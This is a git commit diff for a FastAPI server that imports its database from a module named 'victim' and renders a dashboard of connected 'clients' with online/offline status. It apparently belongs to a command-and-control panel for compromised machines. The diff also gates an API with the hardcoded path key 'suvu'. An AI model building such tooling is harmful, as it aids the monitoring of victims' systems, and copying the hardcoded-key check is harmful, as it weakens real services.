aac267be178735fc638c079779d598af602aec0b
Suvendu <suvendu.chok@gmail.com>
2023-06-04 11:20:59 +0530

    Template file is ready

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ from fastapi.responses import HTMLResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from victim import db
+from datetime import datetime
 
 
 app = FastAPI()
@@ -13,15 +14,28 @@ templates = Jinja2Templates(directory="templates")
 # Home Page
 
 
-@app.get("/")
-async def read_item():
-    alldata = db.DB.collection.find({})
-    return {"status": "success", "client": list(alldata)}
+@app.get("/",response_class=HTMLResponse)
+async def read_item(request: Request):
+    time_duration = 60
+    n = db.DB.collection.count_documents({})
+    data = db.DB.collection.find()
+    data = list(data)
+    l = []
+    for i in data:
+        if i['_id'] != "client-1":
+            l.append({
+                "_id": i['_id'],
+                "username": i["username"],
+                "time": i["time"].strftime("%Y-%m-%d %I:%M:%S %p"),
+                "status": "online" if (datetime.now() - i["time"]).total_seconds() <= time_duration else "offline"
+            })
+    return templates.TemplateResponse("index.html", {"request": request, "signal": True, "client": l, "no_of_client": n-1, "time_duration": time_duration})
+    # return {"signal": True, "client": l, "no_of_client": n-1, "time_duration": time_duration}
 
 
 @app.get("/api/{item_id}")
 async def our_api_handeler(item_id):
-    if item_id == 'suvu-dhs':
+    if item_id == 'suvu':
         try:
             n = db.DB.collection.count_documents({})
             alldata = db.DB.collection.find({})
